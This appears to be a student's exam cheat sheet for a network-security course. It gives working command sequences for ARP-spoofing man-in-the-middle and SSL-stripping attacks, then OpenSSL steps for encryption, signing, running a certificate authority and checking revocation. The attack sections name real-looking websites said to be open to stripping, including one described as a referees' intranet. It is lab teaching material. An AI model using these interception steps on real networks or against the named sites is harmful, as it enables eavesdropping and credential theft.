# NS FINAL EXAM
## MITM 

### Attacker's machine

- To perform the arpspoofing

```sh
sudo arpspoof -i <INTERFACE> -t <VICTIM IP> <GATEWAY IP>
```

- Iptables rules to forward the traffic

```sh
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port <PORT TO LISTEN>
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port <PORT TO LISTEN>
```
- Edit ` /etc/sysctl.conf` and add the following lines

```sh
net.ipv4.ip_forward = 1
net.ipv4.conf.all.send_redirects = 0
```
After that, execute `sudo sysctl -p` to reload the file


- To setup the MITM webserver

```sh
sudo mitmweb --mode transparent --showhost -p <PORT TO LISTEN>
```

### Victim's machine

- Nothing special, only reject the security warnings to access internet

## SSLStrip 
### Attacker's machine

- To perform the arpspoofing

```sh
$ sudo arpspoof <INTERFACE> eth1 -t <VICTIM IP> <GATEWAY IP>
```

- Iptables rules to forward the traffic

```sh
$ sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port <PORT TO LISTEN>
```
- Edit ` /etc/sysctl.conf` and add the following lines

```sh
net.ipv4.ip_forward = 1
net.ipv4.conf.all.send_redirects = 0
```
After that, execute `sudo sysctl -p` to reload the file



- Follow the steps on https://github.com/juanelas/sslstrip to install the `sslstrip` tool. Then climb to `sslstrip` directory and execute

```sh
$ sslstrip -l <PORT TO LISTEN>
```
- To see the content of the comunications
```sh
$ tail -f sslstrip.log
```

### Victim's machine

Due to HSTS, some webpages are unaccesible when the attacks is performed. Here is a list of websites that are accesible when the attack is performed or you can check any other webpage in https://hstspreload.org/:

- banc.com
- intranet.fcf.cat P.D: No diguis que aquesta té l'error, es la que fem servir els arbitres per accedir a les actes ;)
- albertazemar.com
- ericmonne.cat



# Mid-Term Retake

## Symmetric key

### Alice
```sh
$ openssl genrsa -out privAlice.pem 3072
$ openssl rsa -in privAlice.pem -pubout -out pubAlice.pem

$ openssl rand -hex 32 > symKey.bin
$ openssl rand -hex 16 > IV.bin

$ openssl enc -aes-256-cbc -in naranjo.jpg -out naranjo_cipher.enc -K \`cat symKey.bin\` -iv \` cat IV.bin \` -a
$ openssl rsautl -encrypt -in symKey.bin -out symKeyCiphered.enc -inkey pubBob.pem -pubin
$ openssl dgst -sha256 -sign privAlice.pem -out signature.s256 naranjo.jpg
```

### Bob

```sh
$ openssl genrsa -out privBob.pem 3072
$ openssl rsa -in privBob.pem -pubout -out pubBob.pem

$ openssl rsautl -decrypt -in symKeyCiphered.enc -out 
symKeyDeciphered.bin -inkey privBob.pem
$ diff symkey.bin symKeyDeciphered.bin //optional
$ openssl enc -aes-256-cbc -d -in naranjo_cipher.enc -out naranjoDeciphered.jpg -K \`cat symKeyDeciphered.bin\` -iv \` cat IV.bin \` -a
$ openssl dgst -sha256 -verify pubAlice.pem -signature signature.s256 naranjoDeciphered.jpg
```

## CA Root
### Creating the CA

1. Create a directory for the CA
```sh
$ mkdir <DIRECTORY_NAME>
```
2. Climb to the directory that you just created and copy the file that you created in the LAB WORK
```sh
$ cp PATH/TO/FILE .
```
3. Create the directories and files needed
```sh
$ mkdir certs crl newcerts private requests
$ touch index.txt
$ echo 00 > crlnumber
```
4. Create the CA's private key and its CSR

```sh
$ openssl req -config openssl.cnf -new -keyout private/cakey.pem -out requests/careq.pem
```
**You will need to provide several info as password for the private key, CA's CN, etc.**

5. Sign the CA's CSR

```sh
$ openssl ca -config openssl.cnf -extensions v3_ca -days 3652 -create_serial -selfsign -in requests/careq.pem -out cacert.pem
```
**You will need to provide the CA's private key password to complete this step.**
6. Check the certifcate
```sh
$ openssl x509 -noout -text -in cacert.pem
```

### Issuing a WebServer certifcate

1. Create the WebServer's private key and its CSR
```sh
$ openssl req -new -addext 'subjectAltName = IP:<WEBSERVER_IP>' -nodes -keyout tls/webserver.key.pem -out webserver.csr.pem
```
**You will need to provide several info as password for the private key, webserver's CN, etc.**

2. Sign the WebServer CSR with the CA created previously (You should go first to the CA directory)
```sh
$ openssl ca -config openssl.cnf -extensions server_cert -in requests/webserver.csr.pem -out certs/webserver.crt.pem
```
**You will need to provide the CA's private key password to complete this step.**


### Verify CRL

- Get CRL URI
```sh
$ openssl x509 -noout -text -in wikipedia.pem | grep -A 4 'X509v3 CRL Distribution Points'
```

- Download
```sh
$ wget -O crl.der <CRL_URI>
```

- Cast DEM to PEM
```sh
$ openssl crl -inform DER -in crl.der -outform PEM -out crl.pem
```

## Certificate Verification Status

Checking certificate cert.pem signature
```sh
$ openssl verify -CAfile cacert.pem cert.pem
```

Inspecting certificate cert.pem
```sh
$ openssl x509 -in cert.pem -text -noout
```

And check that:
- The certificate is current
- The Common Name or the X509v3 Subject Alternative Name (SAN)extension includes the domain/hostname you are connecting to
- The purpose (Extended Key Usage Extension) is "TLS Web Server Authentication"
- Get OCSP responder url to check revocation status. It is always "http://147.83.118.30:11500"


Check revocation status:
```sh
$ openssl ocsp -CAfile cacert.pem -url http://147.83.118.30:11500 -resp_text -issuer cacert.pem -cert cert.pem
```
